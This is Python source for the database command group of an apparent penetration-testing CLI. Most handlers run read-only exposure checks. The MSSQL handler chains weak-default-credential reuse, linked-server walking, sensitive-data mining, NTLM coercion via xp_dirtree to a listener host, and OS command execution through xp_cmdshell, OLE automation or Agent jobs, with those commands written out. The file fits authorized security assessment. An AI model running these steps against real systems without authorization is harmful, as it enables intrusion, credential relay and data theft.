"""Command handlers for the `db` command group.

Extracted from cli/__init__.py. Helpers (the `_*` functions and _Refresher)
live in cli/helpers.py and are wildcard-re-imported so every helper name
resolves without needing an explicit import per callsite. Public re-exports
come from cli/__init__.py so `recce.cli.cmd_db` still works and the
parser's `_h(...)` lookup finds every handler."""
from __future__ import annotations

import argparse
import os


from .helpers import *  # noqa: F401,F403 — wildcard so private _* helpers resolve


__all__ = ['cmd_db', 'cmd_mssql', 'cmd_mongodb', 'cmd_redis', 'cmd_mysql', 'cmd_postgres', 'cmd_elasticsearch', 'cmd_memcached', 'cmd_couchdb', 'cmd_influxdb', 'cmd_cassandra', 'cmd_oracle', 'cmd_db2']




def cmd_db(args: argparse.Namespace) -> int:
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum` first.")
        return 1
    profile, paths, store = _setup_scan(args)
    if store is None:
        return 1
    title = store.get_meta("engagement") or args.title
    try:
        _phase_db(store, paths, args, profile)
    except KeyboardInterrupt:
        print("\n[!] Interrupted - results collected so far are saved.")
        _recovery_hint(args.output_dir)
    finally:
        _final_report(store, paths, title)
        store.close()
    print("\n[+] Database scan done.")
    return 0


def cmd_mssql(args: argparse.Namespace) -> int:
    """MSSQL offensive enumeration: credential-free pre-auth probes (SQL Browser +
    TDS pre-login), then - with credentials - the nxc access/privilege matrix and
    the full MSSQLPwner-style runbook + attack chain, pre-filled with your creds."""
    from ..services.db import mssql
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`import` first so recce "
              "knows which hosts run MSSQL.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    hosts = _selected_hosts(store.all_hosts(), args)

    creds = None
    if args.username:
        user, domain = _split_userdomain(args.username, args.domain)
        creds = {"user": user, "secret": args.password or "", "domain": domain,
                 "dc_ip": args.dc_ip or ""}

    active = not args.no_probe
    analysis = mssql.analyze(hosts, creds=creds, active=active,
                             lhost=args.lhost or "<LHOST>", **_probe_kwargs(args, "mssql"))
    tgts = analysis["targets"]
    if not tgts:
        print("[!] No MSSQL endpoints in the datastore (no port 1433 / ms-sql "
              "service). Run `enum` against the SQL hosts first.")
        store.close()
        return 0
    print(f"[+] {len(tgts)} MSSQL endpoint(s):")
    for t in tgts:
        extra = []
        if t.get("version"):
            extra.append(mssql.version_name(t["version"]))
        if t.get("encryption"):
            extra.append(f"encryption={t['encryption']}")
        if t.get("instances"):
            extra.append(f"{len(t['instances'])} instance(s) via SQL Browser")
        print(f"      {t['ip']}:{t['port']}  " + "  ".join(extra))

    # Auto-run the nxc access/privilege matrix when creds + tool are present.
    ran_nxc = False
    if creds and not args.no_run:
        tool = mssql.nxc_tool()
        if tool:
            ran_nxc = True
            for t in tgts:
                res, err = mssql.run_nxc_mssql(t["ip"], creds, port=t["port"],
                                               local_auth=args.local_auth)
                if res is None:
                    print(f"      [!] nxc mssql {t['ip']}: {err}")
                    continue
                t["access"], t["admin"] = res["access"], res["admin"]
                if res["access"]:
                    lvl = "SYSADMIN (Pwn3d!)" if res["admin"] else "login OK"
                    print(f"      [+] {t['ip']}:{t['port']}  {lvl} as {creds['user']}")
                    if res["admin"]:
                        analysis["findings"].insert(0, mssql._finding(
                            "critical", "Credentials are sysadmin on this MSSQL instance",
                            f"{t['ip']}:{t['port']}",
                            f"{creds['user']} authenticates as sysadmin (xp_cmdshell / RCE).",
                            "nxc / impacket-mssqlclient",
                            mssql._fill("nxc mssql <ip> -u <user> -p <pass> -x whoami",
                                        mssql._ctx(t, creds)),
                            "Least-privilege the login; remove sysadmin.",
                            ["CWE-250", "CWE-269"]))
        else:
            print("      [i] netexec/nxc not installed - writing the commands to run "
                  "instead (see the MSSQL sheet).")
    elif creds:
        print("      [i] --no-run set - not executing nxc; commands are in the sheet.")

    # Deep enumeration via impacket-mssqlclient: run the queries, detect the actual
    # escalation chain per instance, and enrich the findings + runbook from live data.
    # Auto-promote a weak_default hit into deep-enum credentials — otherwise the
    # depth features (impersonation chain, TRUSTWORTHY, hash harvest, file-read
    # via OPENROWSET) never run in a no-creds WebUI scan even when the C4 sweep
    # already unlocked the instance.
    deep_creds_per_target: dict[str, dict] = {}
    for t in tgts:
        if creds:
            deep_creds_per_target[t["ip"]] = dict(creds)
        elif t.get("weak_default"):
            wd = t["weak_default"]
            deep_creds_per_target[t["ip"]] = {
                "user": wd["user"], "secret": wd["password"], "domain": "",
                "dc_ip": ""}
    ran_impacket = False
    if deep_creds_per_target and not args.no_run and not mssql.mssqlclient_tool():
        print("      [!] impacket-mssqlclient not installed - MSSQL deep enumeration "
              "(linked servers, data-mine, xp_cmdshell, write-proof, file-read) "
              "SKIPPED; the sheet shows commands only. `recce doctor` flags this; "
              "install impacket to run it.")
    if deep_creds_per_target and not args.no_run and mssql.mssqlclient_tool():
        for t in tgts:
            deep_creds = deep_creds_per_target.get(t["ip"])
            if not deep_creds:
                continue
            if t.get("access") is False:            # nxc already said the creds fail
                continue
            if not creds and t.get("weak_default"):
                # No engagement creds — depth is running under the C4-sweep
                # hit. Force local (SQL) auth path so windows-auth doesn't
                # eat the credential.
                windows_auth_this = False
                print(f"      [+] {t['ip']}: running deep enum with C4-sweep "
                      f"credential {deep_creds['user']}")
            else:
                windows_auth_this = not args.local_auth
            enum, err = mssql.run_mssqlclient(t["ip"], deep_creds, port=t["port"],
                                              windows_auth=windows_auth_this)
            if enum is None:
                print(f"      [!] mssqlclient {t['ip']}: {err}")
                continue
            ran_impacket = True
            runner = mssql.link_runner(t["ip"], deep_creds, port=t["port"],
                                       windows_auth=windows_auth_this)
            # Verify db_owner on the TRUSTWORTHY candidates so a chain is CONFIRMED.
            dbo_map = mssql.verify_dbowner(mssql.trustworthy_sysadmin_dbs(enum), runner)
            live_fs, live_chain, summary = mssql.chains_from_enum(t, enum, deep_creds,
                                                                  dbo_map=dbo_map or None)
            analysis["findings"] = live_fs + analysis["findings"]
            for rb in analysis["runbooks"]:
                if rb["ip"] == t["ip"]:
                    rb["live"] = summary
                    if live_chain:
                        rb["chain"] = ["Live chain: " + " -> ".join(live_chain)] + rb["chain"]
            saf = " (sysadmin)" if summary["is_sysadmin"] else ""
            conf = summary.get("dbowner_confirmed") or []
            print(f"      [+] {t['ip']}:{t['port']}  enumerated as {summary['login']}{saf}"
                  f" - {len(summary['logins'])} login(s), {len(summary['links'])} "
                  f"linked server(s), {len(summary['trustworthy'])} TRUSTWORTHY db(s)"
                  + (f", db_owner on {', '.join(conf)}" if conf else ""))

            # Optionally trigger the SQL service account to auth to --lhost (relay).
            if args.relay and args.lhost:
                ok, rerr = mssql.run_xp_dirtree(t["ip"], creds, args.lhost, port=t["port"],
                                                windows_auth=not args.local_auth)
                if ok:
                    print(f"      [+] {t['ip']}: triggered xp_dirtree -> {args.lhost} "
                          "(ensure impacket-ntlmrelayx is listening)")
                else:
                    print(f"      [!] {t['ip']}: relay trigger failed: {rerr}")

            # Recursively walk the linked-server graph from this instance.
            if summary["links"] and not args.no_links:
                nodes = mssql.walk_links(summary["links"], runner,
                                         max_depth=args.link_depth)
                if nodes:
                    lf, lchain = mssql.link_findings(t, nodes, creds)
                    analysis["findings"] = lf + analysis["findings"]
                    for rb in analysis["runbooks"]:
                        if rb["ip"] == t["ip"]:
                            rb["linkgraph"] = nodes
                            if lchain:
                                rb["chain"] = ["Linked-server chain: " + "; ".join(lchain)] \
                                    + rb["chain"]
                    sa_n = sum(1 for n in nodes if n["sysadmin"])
                    print(f"      [+] {t['ip']}: linked-server walk reached {len(nodes)} "
                          f"instance(s), {sa_n} as sysadmin")

            # Mine the databases: tables + interesting columns across every database.
            if args.data:
                dbnames = [r[0] for r in enum.get("databases", [])]
                mined = mssql.run_datamine(dbnames, runner)
                if mined:
                    df = mssql.datamine_findings(t, mined, creds)
                    analysis["findings"] = df + analysis["findings"]
                    for rb in analysis["runbooks"]:
                        if rb["ip"] == t["ip"]:
                            rb["datamine"] = mined
                    sens = sum(1 for v in mined.values() if v["interesting"])
                    print(f"      [+] {t['ip']}: data-mined "
                          f"{sum(len(v['tables']) for v in mined.values())} table(s) "
                          f"across {len(mined)} db(s), {sens} with sensitive columns")
                    sensitive = "\n".join(f"{db}: {', '.join(v['interesting'][:8])}"
                                          for db, v in mined.items() if v["interesting"])
                    if sensitive:
                        _mssql_shot(
                            args, t["ip"], "datamine",
                            f"impacket-mssqlclient {creds['user']}@{t['ip']}",
                            "SELECT s.name+'.'+t.name+'.'+c.name FROM sys.columns c ... "
                            "-- sensitive columns across all databases",
                            sensitive)

            # Per-database object-permission mining (guest / public / object grants).
            if args.perms:
                dbnames = [r[0] for r in enum.get("databases", [])]
                perms = mssql.run_permmine(dbnames, runner)
                if perms:
                    pf = mssql.permmine_findings(t, perms, creds)
                    analysis["findings"] = pf + analysis["findings"]
                    for rb in analysis["runbooks"]:
                        if rb["ip"] == t["ip"]:
                            rb["permmine"] = perms
                    guest = [db for db, v in perms.items() if v["guest"]]
                    grants = sum(len(v["grants"]) for v in perms.values())
                    print(f"      [+] {t['ip']}: permission-mined - {len(guest)} db(s) "
                          f"with guest enabled, {grants} public/guest object grant(s)")

            # Prove write + permission-modify impact, reversibly.
            if args.prove_write:
                token = os.urandom(3).hex()
                ev, werr = mssql.prove_write(t["ip"], creds, token, port=t["port"],
                                             windows_auth=not args.local_auth)
                if ev:
                    analysis["findings"].insert(0, mssql.write_proof_finding(t, ev, creds))
                    extra = " + role membership" if ev.get("perm") == "1" else ""
                    print(f"      [+] {t['ip']}: PROVED write impact (field modify"
                          f"{extra}) - reverted")
                    proof_cmds = [
                        f"CREATE TABLE ##recce_{token} (id INT, note VARCHAR(64))",
                        f"INSERT INTO ##recce_{token} VALUES (1,'before')",
                        f"SELECT note FROM ##recce_{token}   -- before",
                        f"UPDATE ##recce_{token} SET note='{ev.get('update', '')}'",
                        f"SELECT note FROM ##recce_{token}   -- after (MODIFIED)",
                        f"DROP TABLE ##recce_{token}   -- reverted"]
                    proof_out = f"before\n{ev.get('update', '')}"
                    if ev.get("perm") == "1":
                        proof_cmds.append("ALTER SERVER ROLE dbcreator ADD MEMBER "
                                          f"recce_{token}; SELECT IS_SRVROLEMEMBER(...)")
                        proof_out += "\n1   -- role membership added (then reverted)"
                    _mssql_shot(args, t["ip"], "write_proof",
                                f"impacket-mssqlclient {creds['user']}@{t['ip']}",
                                proof_cmds, proof_out)
                else:
                    print(f"      [!] {t['ip']} write proof: {werr}")

            # Execute an OS command for effect (xp_cmdshell / OLE / Agent / CLR).
            if args.exec_cmd:
                out, eerr, ref = mssql.exec_command(
                    t["ip"], creds, args.exec_cmd, method=args.method,
                    port=t["port"], windows_auth=not args.local_auth)
                if ref:
                    print(f"      [i] {t['ip']} CLR is a tool hand-off: {ref}")
                elif eerr:
                    print(f"      [!] {t['ip']} exec ({args.method}): {eerr}")
                else:
                    snippet = " | ".join((out or "(no output)").splitlines()[:4])
                    print(f"      [+] {t['ip']} RCE via {args.method}: {snippet}")
                    rce_cmds = {
                        "xp": [f"EXEC xp_cmdshell '{args.exec_cmd}'"],
                        "ole": ["EXEC sp_OACreate 'WScript.Shell', @o OUT",
                                f"EXEC sp_OAMethod @o,'Run',NULL,'cmd /c {args.exec_cmd} ...'"],
                        "agent": ["EXEC msdb.dbo.sp_add_jobstep @subsystem='CmdExec', "
                                  f"@command='cmd /c {args.exec_cmd}'"],
                    }.get(args.method, [f"EXEC ... {args.exec_cmd}"])
                    _mssql_shot(args, t["ip"], f"rce_{args.method}",
                                f"impacket-mssqlclient {creds['user']}@{t['ip']}",
                                rce_cmds, out or "(no output)")
                    analysis["findings"].insert(0, mssql._finding(
                        "critical", f"Confirmed OS command execution via {args.method}",
                        f"{t['ip']}:{t['port']}",
                        f"Ran '{args.exec_cmd}' as the SQL service account. Output: "
                        + (out or "")[:400], "impacket-mssqlclient",
                        f"recce mssql -u <user> -p <pass> --exec '{args.exec_cmd}' "
                        f"--method {args.method}",
                        "Disable the primitive; run SQL under a low-privilege gMSA.",
                        ["CWE-250", "CWE-269"], kind="rce_confirmed"))

    # With any login we can coerce the service account's NetNTLM via UNC -> relay
    # it. Add the concrete relay finding (real targets) per endpoint.
    if creds:
        for t in tgts:
            rt = mssql.relay_targets(hosts, t["ip"])
            analysis["findings"].append(
                mssql.relay_finding(t, rt, args.lhost or "<LHOST>", creds))

    # De-duplicate findings (offline + nxc + live can overlap) by (title, target).
    seen: set = set()
    uniq = []
    for f in analysis["findings"]:
        k = (f["title"], f["target"])
        if k not in seen:
            seen.add(k)
            uniq.append(f)
    analysis["findings"] = uniq

    # A working SQL login is a foothold on that host -> record access so the Access
    # step auto-ticks. (nxc sets t["access"] above; mark it before the fold persists.)
    host_by_ip = {h.ip: h for h in hosts}
    for t in tgts:
        if t.get("access") and t["ip"] in host_by_ip:
            h = host_by_ip[t["ip"]]
            h.access_gained = True
            h.access_detail = h.access_detail or (
                "MSSQL sysadmin" if t.get("admin") else "MSSQL login")

    # Fold findings into the main severity totals + writeups (attach to each host).
    _fold_service_findings(store, hosts, analysis, "mssql",
                           mssql.findings_to_vulns, "MSSQL")
    # Running mssql assessed each SQL port (and is a DB deep-enum) -> auto-tick the
    # Checklist DB / Vuln-scan boxes for those hosts.
    if active or (creds and not args.no_run):
        _mark_capability_scanned(store, tgts, db=True)
    rb_by_ip = {r["ip"]: r for r in analysis["runbooks"]}
    for t in tgts:
        rb = rb_by_ip.get(t["ip"])          # was next() with no default -> StopIteration
        if not rb:
            continue
        for line in rb.get("chain") or []:
            print(f"      {line}")
    title = store.get_meta("engagement") or args.title
    _generate_reports(store, paths, title)
    store.close()
    ran = [x for x, on in (("nxc", ran_nxc), ("impacket enum", ran_impacket)) if on]
    hint = " + ".join(ran) if ran else "commands-only"
    print(f"    -> MSSQL sheet written ({hint}); findings folded into the main totals.")
    return 0




def cmd_mongodb(args: argparse.Namespace) -> int:
    """Deep MongoDB enumeration: speak the wire protocol (stdlib OP_MSG/BSON), read the
    version, and test whether listDatabases works WITHOUT authentication - an exposed
    instance is a CONFIRMED critical data exposure. Read-only."""
    return _run_service_scan(
        args, module="mongodb", source="mongodb", label="MongoDB",
        noun="MongoDB endpoint(s)",
        no_targets="[!] No MongoDB endpoints in the datastore (no port 27017-27019). "
                   "Run `enum` against the database hosts first.",
        fmt=_fmt_mongodb)




def cmd_redis(args: argparse.Namespace) -> int:
    """Deep Redis enumeration: speak RESP (stdlib), read the version, and test whether
    INFO works WITHOUT authentication - an exposed instance is a CONFIRMED critical
    exposure (full read/write + a file-write -> RCE primitive). Read-only."""
    return _run_service_scan(
        args, module="redis", source="redis", label="Redis", noun="Redis endpoint(s)",
        no_targets="[!] No Redis endpoints in the datastore (no port 6379/6380). Run "
                   "`enum` against the cache/database hosts first.",
        fmt=_fmt_redis)


def cmd_mysql(args: argparse.Namespace) -> int:
    """Deep MySQL/MariaDB enumeration: read the handshake (stdlib) and test whether an
    account logs in with an EMPTY password (root / anonymous) - a CONFIRMED unauth data
    exposure. Read-only (never runs a query)."""
    return _run_service_scan(
        args, module="mysql", source="mysql", label="MySQL", noun="MySQL endpoint(s)",
        no_targets="[!] No MySQL endpoints in the datastore (no port 3306). Run `enum` "
                   "against the database hosts first.",
        fmt=_fmt_mysql)




def cmd_postgres(args: argparse.Namespace) -> int:
    """Deep PostgreSQL enumeration: speak the v3 startup protocol (stdlib) and test for
    `trust` authentication (AuthenticationOk with no password) - a CONFIRMED unauth data
    exposure. Read-only (never runs a query)."""
    return _run_service_scan(
        args, module="postgres", source="postgres", label="PostgreSQL",
        noun="PostgreSQL endpoint(s)",
        no_targets="[!] No PostgreSQL endpoints in the datastore (no port 5432). Run "
                   "`enum` against the database hosts first.",
        fmt=_fmt_postgres)




def cmd_elasticsearch(args: argparse.Namespace) -> int:
    """Deep Elasticsearch enumeration: GET the HTTP API (stdlib), read the version, and
    test whether /_cat/indices works WITHOUT authentication - an exposed cluster is a
    CONFIRMED critical data exposure. Read-only (GETs only)."""
    return _run_service_scan(
        args, module="elasticsearch", source="elasticsearch", label="Elasticsearch",
        noun="Elasticsearch endpoint(s)",
        no_targets="[!] No Elasticsearch endpoints in the datastore (no port "
                   "9200/9201). Run `enum` against the search/log hosts first.",
        fmt=_fmt_elasticsearch)


def cmd_memcached(args: argparse.Namespace) -> int:
    """Deep memcached enumeration: speak the text protocol (stdlib), read the version +
    stats, and sample live keys - an instance that answers `stats` with no credential is
    a CONFIRMED unauthenticated data exposure (+ UDP amplification vector). Read-only."""
    return _run_service_scan(
        args, module="memcached", source="memcached", label="memcached",
        noun="memcached endpoint(s)",
        no_targets="[!] No memcached endpoints in the datastore (no port 11211). Run "
                   "`enum` against the cache hosts first.",
        fmt=_fmt_memcached)


def cmd_couchdb(args: argparse.Namespace) -> int:
    """Deep Apache CouchDB enumeration: GET the HTTP API (stdlib), read /_all_dbs and the
    admin-only config with no credential - a readable admin config means 'admin party'
    (anyone is admin -> RCE), a CONFIRMED critical exposure. Read-only (GETs only)."""
    return _run_service_scan(
        args, module="couchdb", source="couchdb", label="CouchDB",
        noun="CouchDB endpoint(s)",
        no_targets="[!] No CouchDB endpoints in the datastore (no port 5984/6984). Run "
                   "`enum` against the database hosts first.",
        fmt=_fmt_couchdb)


def cmd_influxdb(args: argparse.Namespace) -> int:
    """Deep InfluxDB enumeration: GET /ping for the version and run SHOW DATABASES with
    no credential (stdlib) - a 200 means auth is disabled (default), a CONFIRMED unauth
    exposure; <1.7.6 also flags the JWT auth bypass (CVE-2019-20933). Read-only."""
    return _run_service_scan(
        args, module="influxdb", source="influxdb", label="InfluxDB",
        noun="InfluxDB endpoint(s)",
        no_targets="[!] No InfluxDB endpoints in the datastore (no port 8086). Run "
                   "`enum` against the metrics/TSDB hosts first.",
        fmt=_fmt_influxdb)


def cmd_cassandra(args: argparse.Namespace) -> int:
    """Deep Apache Cassandra enumeration: speak the CQL native protocol (stdlib) - a
    READY response to STARTUP means the node accepts CQL with no credential (default
    AllowAllAuthenticator), a CONFIRMED exposure (and UDF RCE surface). Read-only."""
    return _run_service_scan(
        args, module="cassandra", source="cassandra", label="Cassandra",
        noun="Cassandra endpoint(s)",
        no_targets="[!] No Cassandra endpoints in the datastore (no port 9042). Run "
                   "`enum` against the NoSQL hosts first.",
        fmt=_fmt_cassandra)


def cmd_oracle(args: argparse.Namespace) -> int:
    """Deep Oracle TNS-listener enumeration: speak the TNS wire format (stdlib) to
    CONFIRM an exposed listener and best-effort leak its version - a foothold surface
    for SID brute, TNS Poison (CVE-2012-1675) and default creds. Read-only."""
    return _run_service_scan(
        args, module="oracle", source="oracle", label="Oracle",
        noun="Oracle TNS endpoint(s)",
        no_targets="[!] No Oracle endpoints in the datastore (no port 1521/1522). Run "
                   "`enum` against the database hosts first.",
        fmt=_fmt_oracle)


def cmd_db2(args: argparse.Namespace) -> int:
    """Deep IBM Db2 enumeration: speak DRDA/DDM (stdlib) - exchange server attributes to
    CONFIRM a Db2 endpoint and read its class name + release level, a version-disclosure
    and credential-brute surface. Read-only (never authenticates)."""
    return _run_service_scan(
        args, module="db2", source="db2", label="Db2", noun="Db2 (DRDA) endpoint(s)",
        no_targets="[!] No Db2 endpoints in the datastore (no port 50000). Run `enum` "
                   "against the database hosts first.",
        fmt=_fmt_db2)
